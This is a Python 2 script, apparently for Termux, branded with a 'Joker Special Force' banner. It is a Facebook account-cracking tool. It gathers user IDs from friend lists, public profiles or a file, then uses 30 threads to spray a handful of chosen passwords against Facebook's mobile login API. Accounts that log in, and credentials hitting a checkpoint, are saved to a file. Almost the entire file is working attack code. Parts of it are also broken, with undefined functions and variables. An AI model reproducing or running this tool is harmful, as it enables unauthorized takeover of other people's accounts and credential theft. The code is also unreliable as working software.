#!/usr/bin/python2
#coding=utf-8

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/home/Farhanali/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\n\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
    #os.system('xdg-open https://www.facebook.com/shobi.skyn')
    time.sleep(5)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
##### LOGO #####
banner = """
\033[1;96md88888b  .d8b.  d8888b. db   db  .d8b.  d8b    db 
\033[1;96m88'     d8' `8b 88  `8D 88   88 d8' `8b 888o   88 
\033[1;91m88ooo   88ooo88 88oobY' 88ooo88 88ooo88 88 V8o 88 
\033[1;96m88~~~   88~~~88 88`8b   88~~~88 88~~~88 88  V8o88 
\033[1;96m88      88   88 88 `88. 88   88 88   88 88   V888 
\033[1;96mYP      YP   YP 88   YD YP   YP YP   YP VP    V8P                                  
\033[1;97m-----------------------------------------------
\033[1;91m➣ OWNER   : FARHAN ALI KHAN
\033[1;91m➣ UNITY   : JOKER 007 UNITY
\033[1;91m➣ GANG    : JOKER SPECIAL FORCE
\033[1;91m➣ WhatsApp: ONLY FOR SPECIAL PEOPLES
\033[1;97m-----------------------------------------------"""
back = 0
threads = []
successful = []
checkpoint = []
oks = []
idh = []
id = []
def menu2():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		os.system('python2 Farhanali.py')
		time.sleep(1)
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		os.system('python2 Farhanali.py')
		time.sleep(1)
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		exit()
	os.system("clear")
	print banner
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print "-"+46*"-"
	print "[1] Clone With 5 Choice Passwords."
	print "[2] Clone With 2 Choice Passwords."
	print "[0] Back To Main Menu."
	print "                      "
	menu2_menu()
	
def menu2_menu():
    m2m = raw_input('\nChoose Option >> ')
    if m2m =="":
        print "[!] Filled Incorrectly."
        time.sleep(1)
        menu2_menu()
    elif m2m =="1":
        choice1()
    elif m2m =="2":
        choice2()
    elif m2m =="0":
        os.system('clear')
        hamza('Please Wait.')
        hamza('While Is Returning To Main Menu.')
        time.sleep(1)
        os.system('python2 Farhanali.py')
    else:
        print "[!] Wrong Input."
        menu2_menu()
        
        
def choice1():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Farhanali.py")
	os.system("clear")
	print banner
	print ("[1] Crack From Friend List.")
	print ("[2] Crack From Any Public ID.")
	print ("[3] Crack From File.")
	print ("[0] Back")
	print ("        ")
	choice1_menu()

def choice1_menu():
	c1m = raw_input("\nChoose Option >> ")
	if c1m =="":
		print ("[!] Fill in correctly")
		choice_menu()
	elif c1m =="1":
		os.system("clear")
		print (banner)
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		pass3=raw_input("[3] Input Password  : ")
		pass4=raw_input("[4] Input Password  : ")
		pass5=raw_input("[5] Input Password  : ")
		print (47*"-")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif c1m =="2":
		os.system("clear")
		print (banner)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		pass3=raw_input("[3] Input Password  : ")
		pass4=raw_input("[4] Input Password  : ")
		pass5=raw_input("[5] Input Password  : ")
		print(47*"-")
		print (banner)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza("[✓] Account  Name: "+op["name"])
			
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\nPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif c1m =="3":
		os.system("clear")
		print (banner)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input("[1] Input Password  : ")
			pass2=raw_input("[2] Input Password  : ")
			pass3=raw_input("[3] Input Password  : ")
			pass4=raw_input("[4] Input Password  : ")
			pass5=raw_input("[5] Input Password  : ")
			print(47*"-")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\nPress Enter To Back ")
			choice1()
	elif c1m =="0":
		menu2()
	else:
		print ("[!] Fill in correctly")
		choice1_menu()
	rana = str(len(id))
	hamza ("[✓] Total Friends: "+rana)
	time.sleep(0.5)
	hamza ("[✓] The Process Has Been Started.")
	time.sleep(0.5)
	hamza ("[!] Press CTRL Z To Stop Process")
	time.sleep(0.5)
	print (47*"-")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
										
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	raw_input("\nPress Enter To Back ")
	choice1()
	

def choice2():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Farhanali.py")
	os.system("clear")
	print banner
	print ("[1] Crack From Friend List.")
	print ("[2] Crack From Any Public ID.")
	print ("[3] Crack From File.")
	print ("[0] Back")
	print ("        ")
	choice2_menu()

def choice2_menu():
	c2m = raw_input("\nChoose Option >> ")
	if c2m =="":
		print ("[!] Fill in correctly")
		choice_menu()
	elif c2m =="1":
		os.system("clear")
		print (banner)
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif c2m =="2":
		os.system("clear")
		print (banner)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		print (47*"-")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\nPress Enter To Back ")
			choice2()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif c2m =="3":
		os.system("clear")
		print (banner)
		try:
			idlist = raw_input("[✓] Enter File Path : ")
			pass1=raw_input("[1] Input Password  : ")
			pass2=raw_input("[2] Input Password  : ")
			print(47*"-")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\nPress Enter To Back ")
			choice2()
	elif c2m =="0":
		menu2()
	else:
		print ("[!] Fill in correctly")
		choice2_menu()
	rana = str(len(id))
	hamza ("[✓] Total Friends: "+rana)
	time.sleep(0.5)
	hamza ("[✓] The Process Has Been Started.")
	time.sleep(0.5)
	hamza ("[!] Press CTRL Z To Stop Process.")
	time.sleep(0.5)
	print (47*"-")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)

										
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	raw_input("\nPress Enter To Back ")
	choice2()

	
if __name__ == '__main__':
	menu2()
